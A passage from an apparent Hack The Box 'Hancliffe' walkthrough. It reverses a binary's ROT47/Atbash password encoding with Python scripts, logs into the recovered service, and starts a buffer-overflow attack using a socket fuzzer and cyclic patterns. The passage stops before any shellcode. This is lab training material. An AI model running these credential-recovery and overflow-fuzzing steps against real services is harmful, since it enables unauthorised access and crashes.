<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> echo <span class="st">"YXlYeDtsbD98eDtsWms5SyU="</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span> <span class="kw">|</span> <span class="fu">wc</span> <span class="at">-c</span></span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="ex">17</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. line 22, <code>local_20</code> get the data from <code>enc2Data</code></p>
<div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> echo <span class="st">"YXlYeDtsbD98eDtsWms5SyU="</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span>        </span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ayXx</span><span class="kw">;</span><span class="ex">ll?</span><span class="kw">|</span><span class="ex">x</span><span class="kw">;</span><span class="ex">lZk9K%</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Trying to understand the functions to 100% I decided to replicate the code in Python. After being stuck for a good while I got a hint, the password to the executable is <strong><code>K3r4j@@nM4j@pAh!T</code></strong>. With this we know that after running the password through the encryption algorithms, we should ge the product <code>ayXx;ll?|x;lZk9K%</code>, which is a huge guidance.</p>
<p>With encryption knowledge you should/could have picked up that <code>enc1</code> is actually just ROT47 and <code>enc2</code> Atbash cipher and instantly solve this issue with <a href="https://gchq.github.io/CyberChef/">CyberChef</a>. I did not know this..</p>
<p>After <strong>days</strong> of troubleshooting I finally was finally able to find a massive error, from Ghidra. In the disasembly <code>0x61</code> was some how translated to <code>0x9f</code> in the code, making all my calculation incorrenct. <img src="images/hancliffe06.png" class="img-fluid"></p>
<p>After fixing this I was able to replicate the encryption algorithms.</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>[root:<span class="op">/</span>git<span class="op">/</span>htb<span class="op">/</span>hancliffe]<span class="co"># cat enc.py                                                                                              (master✱) </span></span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python3</span></span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> binascii</span>
<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>pw <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>size <span class="op">=</span> <span class="bu">len</span>(pw)</span>
<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="co">#enc1_pw = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span></span>
<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a>enc1_pw <span class="op">=</span> [<span class="st">"K"</span>,<span class="st">"3"</span>,<span class="st">"r"</span>,<span class="st">"4"</span>,<span class="st">"j"</span>,<span class="st">"@"</span>,<span class="st">"@"</span>,<span class="st">"n"</span>,<span class="st">"M"</span>,<span class="st">"4"</span>,<span class="st">"j"</span>,<span class="st">"@"</span>,<span class="st">"p"</span>,<span class="st">"A"</span>,<span class="st">"h"</span>,<span class="st">"!"</span>,<span class="st">"T"</span>]</span>
<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"==== ENCRYPTION 1 ===="</span>)</span>
<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(size):</span>
<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">#print("ENC1_PW:", enc1_pw[i], ord(enc1_pw[i]))</span></span>
<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ((<span class="dv">32</span> <span class="op">&lt;</span> <span class="bu">ord</span>(enc1_pw[i])) <span class="kw">and</span> (<span class="bu">ord</span>(enc1_pw[i]) <span class="op">!=</span> <span class="dv">127</span>)):</span>
<span id="cb32-15"><a href="#cb32-15" aria-hidden="true" tabindex="-1"></a>        holder <span class="op">=</span> <span class="bu">ord</span>(enc1_pw[i]) <span class="op">+</span> <span class="dv">47</span></span>
<span id="cb32-16"><a href="#cb32-16" aria-hidden="true" tabindex="-1"></a>        <span class="co">#print("IF1:", pw[i], ord(pw[i]), holder)</span></span>
<span id="cb32-17"><a href="#cb32-17" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb32-18"><a href="#cb32-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="bu">ord</span>(enc1_pw[i]) <span class="op">+</span> <span class="dv">47</span> <span class="op">&lt;</span> <span class="dv">127</span>):</span>
<span id="cb32-19"><a href="#cb32-19" aria-hidden="true" tabindex="-1"></a>            enc1_pw[i] <span class="op">=</span> holder</span>
<span id="cb32-20"><a href="#cb32-20" aria-hidden="true" tabindex="-1"></a>            <span class="co">#print("IF2:", enc1_pw[i])</span></span>
<span id="cb32-21"><a href="#cb32-21" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb32-22"><a href="#cb32-22" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
<span id="cb32-23"><a href="#cb32-23" aria-hidden="true" tabindex="-1"></a>            enc1_pw[i] <span class="op">=</span> holder <span class="op">-</span> <span class="dv">94</span></span>
<span id="cb32-24"><a href="#cb32-24" aria-hidden="true" tabindex="-1"></a>            <span class="co">#print("ELSE:", enc1_pw[i])</span></span>
<span id="cb32-25"><a href="#cb32-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-26"><a href="#cb32-26" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"ENC1:"</span>, enc1_pw)</span>
<span id="cb32-27"><a href="#cb32-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-28"><a href="#cb32-28" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"</span><span class="ch">\n</span><span class="st">==== ENCRYPTION 2 ===="</span>)</span>
<span id="cb32-29"><a href="#cb32-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-30"><a href="#cb32-30" aria-hidden="true" tabindex="-1"></a>enc2_pw <span class="op">=</span> enc1_pw</span>
<span id="cb32-31"><a href="#cb32-31" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(size):</span>
<span id="cb32-32"><a href="#cb32-32" aria-hidden="true" tabindex="-1"></a>    holder2 <span class="op">=</span> enc1_pw[i]</span>
<span id="cb32-33"><a href="#cb32-33" aria-hidden="true" tabindex="-1"></a>    <span class="co">#print("HOLDER2:", holder2)</span></span>
<span id="cb32-34"><a href="#cb32-34" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ((holder2 <span class="op">&lt;</span> <span class="dv">65</span>) <span class="kw">or</span> (<span class="dv">90</span> <span class="op">&lt;</span> holder2 <span class="kw">and</span> holder2 <span class="op">&lt;</span> <span class="dv">97</span>) <span class="kw">or</span> (<span class="dv">122</span> <span class="op">&lt;</span> holder2)):</span>
<span id="cb32-35"><a href="#cb32-35" aria-hidden="true" tabindex="-1"></a>        enc2_pw[i] <span class="op">=</span> holder2</span>
<span id="cb32-36"><a href="#cb32-36" aria-hidden="true" tabindex="-1"></a>        <span class="co">#print("IF1:", holder2)</span></span>
<span id="cb32-37"><a href="#cb32-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
<span id="cb32-38"><a href="#cb32-38" aria-hidden="true" tabindex="-1"></a>        var2 <span class="op">=</span> holder2 <span class="op">&lt;</span> <span class="dv">91</span></span>
<span id="cb32-39"><a href="#cb32-39" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (var2):</span>
<span id="cb32-40"><a href="#cb32-40" aria-hidden="true" tabindex="-1"></a>            holder2 <span class="op">=</span> holder2 <span class="op">+</span> <span class="dv">32</span></span>
<span id="cb32-41"><a href="#cb32-41" aria-hidden="true" tabindex="-1"></a>            <span class="co">#print("IF2:", holder2)</span></span>
<span id="cb32-42"><a href="#cb32-42" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb32-43"><a href="#cb32-43" aria-hidden="true" tabindex="-1"></a>        enc2_pw[i] <span class="op">=</span> <span class="bu">ord</span>(<span class="st">"z"</span>) <span class="op">-</span> (holder2 <span class="op">-</span> <span class="dv">97</span>)</span>
<span id="cb32-44"><a href="#cb32-44" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-45"><a href="#cb32-45" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (var2):</span>
<span id="cb32-46"><a href="#cb32-46" aria-hidden="true" tabindex="-1"></a>            enc2_pw[i] <span class="op">=</span> enc2_pw[i] <span class="op">-</span> <span class="dv">32</span></span>
<span id="cb32-47"><a href="#cb32-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-48"><a href="#cb32-48" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"ENC2:"</span>, enc2_pw)</span>
<span id="cb32-49"><a href="#cb32-49" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"CORR: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> ./enc.py</span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">====</span> ENCRYPTION 1 ====</span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ENC1:</span> [122, 98, 67, 99, 59, 111, 111, 63, 124, 99, 59, 111, 65, 112, 57, 80, 37]</span>
<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="ex">====</span> ENCRYPTION 2 ====</span>
<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a><span class="ex">ENC2:</span> [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]</span>
<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="ex">CORR:</span> [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Looking for strings in the binary we find a few more interesting lines that might be usefull later.<br> <img src="images/hancliffe07.png" class="img-fluid"></p>
<hr>
</section>
<section id="step-4-1" class="level3">
<h3 class="anchored" data-anchor-id="step-4-1">Step 4</h3>
<p>With a deeper understanding of the binary we can simply reverse it by changing the orders of enc1 and enc2.</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>[root:<span class="op">/</span>git<span class="op">/</span>htb<span class="op">/</span>hancliffe]<span class="co"># cat dec.py                                                                                              (master✱) </span></span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python3</span></span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> base64</span>
<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="co">#b64pw = "YXlYeDtsbD98eDtsWms5SyU="</span></span>
<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a>b64pw <span class="op">=</span> <span class="bu">input</span>(<span class="st">"Enter Base64 to Reverse: "</span>)</span>
<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a>decode <span class="op">=</span> base64.b64decode(b64pw)</span>
<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a>enc2_pw <span class="op">=</span> [<span class="bu">chr</span>(p) <span class="cf">for</span> p <span class="kw">in</span> decode]</span>
<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span> (<span class="bu">len</span>(enc2_pw)):</span>
<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a>    holder2 <span class="op">=</span> <span class="bu">ord</span>(enc2_pw[i])</span>
<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ((holder2 <span class="op">&lt;</span> <span class="dv">65</span>) <span class="kw">or</span> (<span class="dv">90</span> <span class="op">&lt;</span> holder2 <span class="kw">and</span> holder2 <span class="op">&lt;</span> <span class="dv">97</span>) <span class="kw">or</span> (<span class="dv">122</span> <span class="op">&lt;</span> holder2)):</span>
<span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a>        enc2_pw[i] <span class="op">=</span> holder2</span>
<span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
<span id="cb34-15"><a href="#cb34-15" aria-hidden="true" tabindex="-1"></a>        var2 <span class="op">=</span> holder2 <span class="op">&lt;</span> <span class="dv">91</span></span>
<span id="cb34-16"><a href="#cb34-16" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (var2):</span>
<span id="cb34-17"><a href="#cb34-17" aria-hidden="true" tabindex="-1"></a>            holder2 <span class="op">=</span> holder2 <span class="op">+</span> <span class="dv">32</span></span>
<span id="cb34-18"><a href="#cb34-18" aria-hidden="true" tabindex="-1"></a>        enc2_pw[i] <span class="op">=</span> <span class="bu">ord</span>(<span class="st">"z"</span>) <span class="op">-</span> (holder2 <span class="op">-</span> <span class="dv">97</span>)</span>
<span id="cb34-19"><a href="#cb34-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (var2):</span>
<span id="cb34-20"><a href="#cb34-20" aria-hidden="true" tabindex="-1"></a>            enc2_pw[i] <span class="op">=</span> enc2_pw[i] <span class="op">-</span> <span class="dv">32</span></span>
<span id="cb34-21"><a href="#cb34-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-22"><a href="#cb34-22" aria-hidden="true" tabindex="-1"></a>enc1_pw <span class="op">=</span> enc2_pw</span>
<span id="cb34-23"><a href="#cb34-23" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span> (<span class="bu">len</span>(enc2_pw)):</span>
<span id="cb34-24"><a href="#cb34-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ((<span class="dv">32</span> <span class="op">&lt;</span> enc1_pw[i]) <span class="kw">and</span> (enc1_pw[i] <span class="op">!=</span> <span class="dv">127</span>)):</span>
<span id="cb34-25"><a href="#cb34-25" aria-hidden="true" tabindex="-1"></a>        holder <span class="op">=</span> enc1_pw[i] <span class="op">+</span> <span class="dv">47</span></span>
<span id="cb34-26"><a href="#cb34-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (enc1_pw[i] <span class="op">+</span> <span class="dv">47</span> <span class="op">&lt;</span> <span class="dv">127</span>):</span>
<span id="cb34-27"><a href="#cb34-27" aria-hidden="true" tabindex="-1"></a>            enc1_pw[i] <span class="op">=</span> holder</span>
<span id="cb34-28"><a href="#cb34-28" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
<span id="cb34-29"><a href="#cb34-29" aria-hidden="true" tabindex="-1"></a>            enc1_pw[i] <span class="op">=</span> holder <span class="op">-</span> <span class="dv">94</span></span>
<span id="cb34-30"><a href="#cb34-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-31"><a href="#cb34-31" aria-hidden="true" tabindex="-1"></a>password <span class="op">=</span> [<span class="bu">chr</span>(x) <span class="cf">for</span> x <span class="kw">in</span> enc1_pw]</span>
<span id="cb34-32"><a href="#cb34-32" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"Password: "</span>, <span class="op">*</span>password, sep<span class="op">=</span><span class="st">''</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> ./dec.py</span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> Base64 to Reverse: YXlYeDtsbD98eDtsWms5SyU=</span>
<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> K3r4j@@nM4j@pAh!T</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Running the application we can use the <code>FullName</code> and <code>Code</code> we found from the strings. The application unlocks but closes directly. Maybe it is at this point we should break the application through any of the other input variables.</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> nc 10.10.11.115 9999</span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> alfiansyah</span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> K3r4j@@nM4j@pAh!T</span>
<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Login</span> Successfully!</span>
<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a><span class="ex">FullName:</span> Vickry Alfiansyah</span>
<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Input</span> Your Code: T3D83CbJkl1299</span>
<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Unlocked</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-5" class="level3">
<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
<p>Playing around with the application (locally) it seems that it’s vulnerable to <strong>buffer overflow</strong> in the <code>Code</code> input variable.</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> nc 172.30.1.118 9449</span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> alfiansyah</span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> K3r4j@@nM4j@pAh!T</span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Login</span> Successfully!</span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="ex">FullName:</span> asdf</span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Input</span> Your Code: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<section id="fuzzing" class="level4">
<h4 class="anchored" data-anchor-id="fuzzing">Fuzzing</h4>
<p>We use <code>fuzzer.py</code> until the application crash inside Immunity Debugger.</p>
<div class="sourceCode" id="cb38"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>[root:<span class="op">/</span>git<span class="op">/</span>htb<span class="op">/</span>hancliffe]<span class="co"># cat fuzzer.py</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket, time, sys</span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>IP <span class="op">=</span> <span class="st">"172.30.1.118"</span></span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a>PORT <span class="op">=</span> <span class="dv">9086</span></span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a>timeout <span class="op">=</span> <span class="dv">5</span></span>
<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> <span class="st">"alfiansyah"</span></span>
<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a>passwd <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a>fullname <span class="op">=</span> <span class="st">"random-data"</span></span>
<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">=</span> []</span>
<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a>counter <span class="op">=</span> <span class="dv">20</span></span>
<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="bu">len</span>(<span class="bu">buffer</span>) <span class="op">&lt;</span> <span class="dv">30</span>:</span>
<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a>    <span class="bu">buffer</span>.append(<span class="st">"A"</span> <span class="op">*</span> counter)</span>
<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a>    counter <span class="op">+=</span> <span class="dv">20</span></span>
<span id="cb38-18"><a href="#cb38-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-19"><a href="#cb38-19" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> string <span class="kw">in</span> <span class="bu">buffer</span>:</span>
<span id="cb38-20"><a href="#cb38-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>:</span>
<span id="cb38-21"><a href="#cb38-21" aria-hidden="true" tabindex="-1"></a>        s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb38-22"><a href="#cb38-22" aria-hidden="true" tabindex="-1"></a>        s.settimeout(timeout)</span>
<span id="cb38-23"><a href="#cb38-23" aria-hidden="true" tabindex="-1"></a>        <span class="ex">connect</span> <span class="op">=</span> s.<span class="ex">connect</span>((IP, PORT))</span>
<span id="cb38-24"><a href="#cb38-24" aria-hidden="true" tabindex="-1"></a>        s.recv(<span class="dv">1024</span>)</span>
<span id="cb38-25"><a href="#cb38-25" aria-hidden="true" tabindex="-1"></a>        s.send(user)</span>
<span id="cb38-26"><a href="#cb38-26" aria-hidden="true" tabindex="-1"></a>        s.recv(<span class="dv">1024</span>)</span>
<span id="cb38-27"><a href="#cb38-27" aria-hidden="true" tabindex="-1"></a>        s.send(passwd)</span>
<span id="cb38-28"><a href="#cb38-28" aria-hidden="true" tabindex="-1"></a>        s.recv(<span class="dv">1024</span>)</span>
<span id="cb38-29"><a href="#cb38-29" aria-hidden="true" tabindex="-1"></a>        s.send(fullname)</span>
<span id="cb38-30"><a href="#cb38-30" aria-hidden="true" tabindex="-1"></a>        s.recv(<span class="dv">1024</span>)</span>
<span id="cb38-31"><a href="#cb38-31" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">"Fuzzing with </span><span class="sc">%s</span><span class="st"> bytes"</span> <span class="op">%</span> <span class="bu">len</span>(string))</span>
<span id="cb38-32"><a href="#cb38-32" aria-hidden="true" tabindex="-1"></a>        s.send(string)</span>
<span id="cb38-33"><a href="#cb38-33" aria-hidden="true" tabindex="-1"></a>        s.recv(<span class="dv">1024</span>)</span>
<span id="cb38-34"><a href="#cb38-34" aria-hidden="true" tabindex="-1"></a>        s.close()</span>
<span id="cb38-35"><a href="#cb38-35" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span>:</span>
<span id="cb38-36"><a href="#cb38-36" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">"Could not connect to "</span> <span class="op">+</span> IP <span class="op">+</span> <span class="st">":"</span> <span class="op">+</span> <span class="bu">str</span>(PORT))</span>
<span id="cb38-37"><a href="#cb38-37" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">0</span>)</span>
<span id="cb38-38"><a href="#cb38-38" aria-hidden="true" tabindex="-1"></a>    time.sleep(<span class="dv">1</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>When the application crashes EIP should be equal to <strong>41414141</strong>, the hex value of “AAAA”.</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> ./fuzzer.py</span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Fuzzing</span> with 20 bytes</span>
<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Fuzzing</span> with 40 bytes</span>
<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Fuzzing</span> with 60 bytes</span>
<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Fuzzing</span> with 80 bytes</span>
<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Fuzzing</span> with 100 bytes</span>
<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Could</span> not connect to 172.30.1.118:9086</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><img src="images/hancliffe08.png" class="img-fluid"></p>
<hr>
</section>
<section id="crash-replication-controlling-eip" class="level4">
<h4 class="anchored" data-anchor-id="crash-replication-controlling-eip">Crash Replication &amp; Controlling EIP</h4>
<p>Generate a cyclic pattern to find the exact offset of the crash. <strong>Note:</strong> the size must be <strong>bigger</strong> than the crash offset.</p>
<div class="sourceCode" id="cb40"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Mona</span></span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="ex">!mona</span> pc 130</span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a></span>
